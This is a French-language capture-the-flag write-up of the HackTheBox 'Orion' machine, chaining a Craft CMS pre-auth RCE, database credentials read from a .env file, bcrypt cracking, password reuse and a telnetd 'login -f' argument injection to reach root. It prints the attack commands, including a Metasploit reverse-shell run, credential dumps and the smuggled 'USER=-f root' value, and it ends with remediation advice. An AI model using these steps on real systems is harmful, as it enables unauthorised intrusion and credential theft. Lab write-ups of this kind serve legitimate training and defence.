# Orion — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Linux — Ubuntu 22.04 (kernel 5.15) |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-11-01 → 2026-11-02 |
| **Vecteur** | Craft CMS **CVE-2025-32432** (RCE pré-auth) → creds MySQL dans `.env` → crack bcrypt admin → SSH `adam` (réutilisation) → **telnetd `login -f` argument injection** (CVE-2026-24061) → root |
| **CVE** | CVE-2025-32432 (Craft) · CVE-2026-24061 (inetutils-telnetd) |
| **Tags** | web · craft-cms · object-injection · mysql · password-reuse · hashcat · telnetd · argument-injection · privesc |

> ⚠️ L'IP change à chaque reset (vue : `10.129.244.146`). `echo '<IP> orion.htb' | sudo tee -a /etc/hosts`.

---

## TL;DR

**Recon → `/admin/login` = Craft CMS 5.6.16, vulnérable à CVE-2025-32432 (RCE non authentifiée via `generate-transform`, injection dans le conteneur Yii2) → shell `www-data`. Les creds MySQL root traînent dans le `.env` de Craft → dump de `orion.users` → hash bcrypt de l'admin → crack rockyou = `darkangel`. Mot de passe réutilisé → SSH `adam` (user.txt). Privesc : sudo/SUID/caps propres, PwnKit patché ; un `telnetd` custom écoute en root sur 127.0.0.1:23 via inetd, et invoque `/usr/bin/login` en y insérant le nom d'utilisateur fourni par le client comme argument → injection `-f root` (CVE-2026-24061) → `login -f root` = root sans mot de passe.**

---

## 1. Reconnaissance

```bash
└─$ nmap -sS -sV -sC -p- 10.129.244.146
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)   # redirige vers orion.htb
└─$ echo '10.129.244.146 orion.htb' | sudo tee -a /etc/hosts
```

```bash
└─$ gobuster dir -u http://orion.htb/ -w /usr/share/wordlists/dirb/common.txt
admin        (302) -> /admin/login
assets       (301)
index.php    (200)
```
➡️ `http://orion.htb/admin/login` = **Craft CMS 5.6.16**.

| Port | Service | Piste |
| --- | --- | --- |
| 22 | SSH | accès une fois des creds obtenus |
| 80 | nginx / Craft CMS 5.6.16 | **point d'entrée** (CVE-2025-32432) |

---

## 2. Accès initial — Craft CMS CVE-2025-32432

Craft **≤ 5.6.16** = RCE **non authentifiée** via l'endpoint `admin/actions/assets/generate-transform` : le `handle` du transform est passé au **conteneur de dépendances Yii2** (`Craft::createObject`) → object/container injection → exécution de code.

> ⚠️ **Pièges rencontrés :**
> - l'endpoint attend un **POST JSON** (pas un GET) et un **`assetId` valide** (brute 1..N, détecté via phpinfo) ;
> - mon exploit python manuel n'a pas abouti → passé par le **module Metasploit** `exploit/linux/http/craftcms_preauth_rce_cve_2025_32432` (rank *excellent*) → shell **www-data**.

```bash
msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
msf > set RHOSTS orion.htb ; set LHOST tun0 ; run
# -> meterpreter / shell www-data
```

Shell non-interactif (pas de TTY) → stabilisation :
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 3. www-data → adam (creds MySQL + crack)

Les identifiants de base vivent dans le **`.env` de Craft** (racine du projet) :
```bash
www-data@orion:~/html/craft/web$ cat ../.env     # DB_PASSWORD=SuperSecureCraft123Pass!
```
MySQL n'exige pas de TTY si on passe tout en ligne (`-p` collé + `-e`) :
```bash
mysql -u root -p'SuperSecureCraft123Pass!' -e "show databases;"    # -> base 'orion'
mysql -u root -p'SuperSecureCraft123Pass!' -e "select id,username,email,password from orion.users\G"
# id:1  username:admin  email:adam@orion.htb
# password:$2y$13$e9zuohgFZzGtbQalcn9Mz...   (bcrypt Craft)
```
Crack du hash bcrypt :
```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz...' > hash.txt
john --wordlist=rockyou.txt hash.txt       # (hashcat -m 3200 équivalent)
# -> darkangel
```
**Réutilisation** du mot de passe → SSH :
```bash
ssh adam@10.129.244.146        # mdp : darkangel   -> user.txt
```

---

## 4. Élévation de privilèges — telnetd `login -f` injection (CVE-2026-24061)

Énumération : **rien** d'exploitable en direct.
```bash
sudo -l                 # adam may not run sudo
find / -perm -4000 ...  # SUID standard (rcp/rsh/rlogin présents mais non exploitables)
getcap -r /             # caps standard (ping, snap-confine)
pkexec --version        # 0.105 -> PwnKit TESTÉ mais PATCHÉ (rétro-port) : affiche l'usage au lieu d'un shell
```
> ⚠️ **Leçon** : `pkexec 0.105` est la version « vulnérable » historique, mais le fix CVE-2021-4034 est **rétro-porté** ici. Le PoC qui recrache l'**usage de pkexec** = patché. **La version seule ne prouve pas la vuln.**

Le signal utile : un service en écoute **anormal**.
```bash
adam@orion:~$ ss -tlnp
LISTEN  127.0.0.1:23     # telnet sur localhost (!)
LISTEN  127.0.0.1:3306   # mysql
ps aux | grep -i inetd   # root  /usr/sbin/inetutils-inetd  +  root telnetd
```
```bash
cat /etc/inetd.conf
# 127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd
ls -la /usr/local/sbin/telnetd      # -> /usr/libexec/telnetd (GNU inetutils, root)
strings /usr/libexec/telnetd | grep login
# /usr/bin/login -p -h %h %?u{-f %u}{%U}      <-- LE point faible
```

**Le mécanisme :** le telnetd lance `/usr/bin/login` **en root** et y insère le **nom d'utilisateur fourni par le client** (`%U`) **comme argument brut**. En injectant `USER=-f root`, la commande devient `login -p -h localhost -f root` → le flag **`-f` = « user déjà authentifié »** → **login root sans mot de passe**. C'est **CVE-2026-24061**.

> ⚠️ **Piège manuel** : `telnet -l '-froot'` (un seul token) est **rejeté** (`login` veut `-f` et `name` en deux arguments). Il faut que l'injection produise **deux tokens** (`-f` puis `root`). Le PoC le fait proprement via l'option **ENVIRON** du protocole telnet (variable `USER`).

```bash
# PoC : Ish3ng0m4/CVE-2026-24061-Telnetd  (injecte USER=-f root via ENVIRON)
adam@orion:/tmp$ python3 poc.py 127.0.0.1 23
[*] Injected USER=-f root
[+] VULNERABLE
# -> shell root
id            # uid=0(root)
```

**Résultat :** `root`. Flag : `<non publié — règle HTB>`.

> **Pourquoi ça marche (à l'oral) :** même famille que l'injection de wildcard 7z (Usage) — un **argument contrôlé par l'attaquant** passé à un binaire privilégié change son comportement. Ici le nom d'utilisateur telnet devient un **flag** de `login`. Le protocole telnet permet d'envoyer des **variables d'environnement** (option ENVIRON) au daemon, qui les relaie à `login`.

---

## 5. Remédiation

- **Craft** : mettre à jour (≥ 5.6.17 / 4.14.15), restreindre `generate-transform`, WAF sur l'endpoint, invalider les clés après compromission.
- **Secrets** : `.env` hors webroot et à droits stricts ; pas de compte MySQL `root` pour l'appli ; creds applicatifs distincts.
- **Pas de réutilisation** de mot de passe (admin Craft → compte système adam).
- **Telnet** : ne jamais exposer telnetd (même en localhost) ; si inetd requis, pas de service lançant `login` avec un nom client non filtré ; patcher inetutils (CVE-2026-24061).
- **Durcissement** : moindre privilège, désactiver les services legacy (rsh/rlogin/telnet).

---

## 6. Leçons

- **CVE-2025-32432** = injection dans le conteneur Yii2 (object injection côté DI) → à ranger avec les désérialisations.
- **`.env` = coffre à secrets** : premier fichier à lire sur une appli PHP/Laravel/Craft.
- **pkexec : version ≠ vulnérable** (fix rétro-porté). Tester, lire le résultat (usage = patché), passer à autre chose.
- **Service anormal en localhost** (`ss -tlnp`) = souvent la privesc. Un telnet sur :23 n'a aucune raison d'exister.
- **Argument injection dans un binaire privilégié** : telnetd → `login -f` (CVE-2026-24061). Nouvelle technique à garder en cheatsheet.

---

## Références

- Craft CMS CVE-2025-32432 (advisory Censys / Orange Cyberdefense) · module Metasploit `craftcms_preauth_rce_cve_2025_32432`
- CVE-2026-24061 (inetutils telnetd `login -f` injection) · PoC `Ish3ng0m4/CVE-2026-24061-Telnetd`
- Fiches outil liées : [telnetd-login-injection](../outils/telnetd-login-injection.md) · [linux-privesc](../outils/linux-privesc.md) · [hashcat](../outils/hashcat.md) · [sqlmap](../outils/sqlmap.md)
